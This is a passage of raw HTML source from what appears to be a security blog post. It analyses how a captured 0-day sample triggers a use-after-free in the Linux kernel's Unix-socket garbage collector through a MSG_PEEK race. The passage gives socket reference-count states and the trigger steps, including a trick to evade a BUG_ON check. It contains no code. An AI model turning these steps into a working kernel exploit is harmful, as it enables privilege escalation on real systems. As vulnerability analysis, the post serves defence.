style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c50 c19 c49 c42\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c50 c19 c49 c42\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Then, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c39\"&gt;without&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;rsquo;s receive queue is removed. &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;also fetches a new file descriptor &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNsC7ADpPbHG_EVgFzDOGi6oaXluRrxDKc6kaQAkdwadnfFOu4SbwVESi0-SGHDwu9La-ztndastPnhfiocmhd6fmU0mhCy9a5sDosCQu6eW3x_uu7wHGL5d1c0eMTO3inZlhObh4faQkcGU2fM6zd-cXDjbg6fjS6CKUMpT8Sre9XHefE7Exrt04s/s1344/image67.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNsC7ADpPbHG_EVgFzDOGi6oaXluRrxDKc6kaQAkdwadnfFOu4SbwVESi0-SGHDwu9La-ztndastPnhfiocmhd6fmU0mhCy9a5sDosCQu6eW3x_uu7wHGL5d1c0eMTO3inZlhObh4faQkcGU2fM6zd-cXDjbg6fjS6CKUMpT8Sre9XHefE7Exrt04s/s1200/image67.png\" border=\"0\" alt=\"After f01 receives the socket file descriptor without MSG_PEEK, the receive queue is cleared and file descriptor f00&amp;#39;&amp;#39;&amp;#39; is obtained.\" style=\"max-height: 750px; max-width: 600px;\"title=\"After f01 receives the socket file descriptor without MSG_PEEK, the receive queue is cleared and file descriptor f00&amp;#39;&amp;#39;&amp;#39; is obtained.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;The receive queue of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;&amp;nbsp;is cleared and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;&amp;nbsp;is obtained from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Status:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_9gryrzygx46m-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;) = 3&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c13 c15 c19\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c50 c19 c49 c42\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.v0psi01ks7q2\"&gt;&lt;span class=\"ykcrMYlEiJ-c1\"&gt;UAF Scenario&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;From a very high level perspective, the internal state of Linux garbage collection can be non-deterministic because &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not synchronized with the garbage collector. T&lt;/span&gt;&lt;span&gt;here is a race condition where the garbage collector can treat an inflight socket as a garbage candidate while the file reference is incremented at the same time during the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;receive. As a consequence, the garbage collector may purge the candidate, freeing the socket buffer, while a receiver may install the file descriptor, leading to a UAF on the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;object.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Let&amp;rsquo;s see how the captured &lt;/span&gt;&lt;span&gt;0-day&lt;/span&gt;&lt;span&gt;&amp;nbsp;sample triggers the bug step by step (simplified version, in reality you may need more threads working together, but it should demonstrate the core idea). First of all, the sample allocates the following socket pairs and single socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_whw4pjgxp3w1-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;sock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;nbsp;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(actually there might be even thousands of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;&amp;nbsp;for protracting the garbage collection process in order to evade a &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;check which will be introduced later).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Now, the program does the below operations:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAHUeccUboPeEe8ydW1HHpM2R-iibCZnsJSrhByCsnhQHtW4IJcC_8GEPtO3R3GPV5x2C9xJfxT7l6Z3UoqRcUeMtuf65G9wI2tPnd91q_vO7spVOfZgAwjeC6WCILmjs1ED618PGlxgMp196O3odP-fKaqIloMSEYRNory126HtXPNyyXCUWefJew/s564/image17.png\" style=\"display: block; padding: 1em 0;text-align: left;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAHUeccUboPeEe8ydW1HHpM2R-iibCZnsJSrhByCsnhQHtW4IJcC_8GEPtO3R3GPV5x2C9xJfxT7l6Z3UoqRcUeMtuf65G9wI2tPnd91q_vO7spVOfZgAwjeC6WCILmjs1ED618PGlxgMp196O3odP-fKaqIloMSEYRNory126HtXPNyyXCUWefJew/s564/image17.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 250px; border:0; box-shadow: none; --webkit-box-shadow: none; --moz-box-shadow: none;\" title=\"\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Close the following file descriptors prior to any &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;calls:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_9gryrzygx46m-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;Close&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;Close&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c50 c19 c49 c42\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;Close&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c50 c19 c49 c42\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;Close&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;Close&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;Close&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;Close&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&amp;#x1d6fc;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Here is the status:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_9gryrzygx46m-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;N&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;nbsp;+ 1, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;N &lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;+ 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 2, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;) = 2&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 3, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;) = 3&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c50 c19 c49 c42\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 